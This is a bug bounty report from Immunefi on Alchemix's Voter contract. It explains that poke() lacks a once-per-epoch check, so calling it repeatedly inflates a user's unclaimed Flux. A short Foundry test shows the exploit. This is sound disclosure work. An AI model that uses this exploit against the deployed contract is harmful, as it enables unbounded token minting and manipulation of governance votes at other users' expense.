# 30788 - \[SC - Critical] User can increase their unclaimed Flux token wi...

Submitted on May 6th 2024 at 01:39:08 UTC by @jecikpo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30788

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* unbounded minting of token
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

A user can increase their unclaimed Flux token amount by calling `Voter.poke()` multiple times.

## Vulnerability Details

The `Voter._vote()` function calls `FluxToken.accrueFlux(_tokenId)` which increases the `unclaimed[_tokenId]` balance according the `_tokenId` voting power. `_vote()` is called by `vote()` which has the `onlyNewEpoch(_tokenId)` modifier attached, so it can be called only once during each epoch.

The `_vote()` is also used inside `poke()`. `poke()` is supposed to vote based on the users previous voting weights. however `poke()` does not have the above mentioned modifier attached, hence it can be called multiple times during the epoch without any limits. Each time `poke()` is called the unclaimed FLUX is increased.

## Impact Details

The impact is that the user can accrue potentially unlimited amount of unclaimed Flux. The unclaimed Flux could be used to execute unfair voting by increasing the user's voting power. It could also be claimed and sold on the open market to suppress the Flux price which will allow other users to unlock their veALCX tokens at lower prices hence destroying the entire voting system credibility.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195>

## Proof of Concept

Add to the `VotingEscrow.t.sol` the following code:

```solidity
function testAbusePoke() public {
        hevm.startPrank(admin);

        uint256 tokenIdLarge = veALCX.createLock(TOKEN_100K, THREE_WEEKS, false);
        //uint256 tokenIdSmall = veALCX.createLock(TOKEN_1, THREE_WEEKS, false);


        voter.reset(tokenIdLarge);
        console.log("Unclaimed Flux on tokenIdLarge: %d", flux.unclaimedFlux(tokenIdLarge));
        voter.poke(tokenIdLarge);
        // we can see that the user amassed more unclaimed FLUX: 9420478183663114723056
        console.log("Unclaimed Flux on tokenIdLarge after poke called once: %d", flux.unclaimedFlux(tokenIdLarge));

        // even more after calling poke() again: 14130717275494672084584
        voter.poke(tokenIdLarge);
        console.log("Unclaimed Flux on tokenIdLarge after poke called twice: %d", flux.unclaimedFlux(tokenIdLarge));

        // and again: 18840956367326229446112
        voter.poke(tokenIdLarge);
        console.log("Unclaimed Flux on tokenIdLarge after poke called thrid time: %d", flux.unclaimedFlux(tokenIdLarge));

        hevm.stopPrank();
    }
```
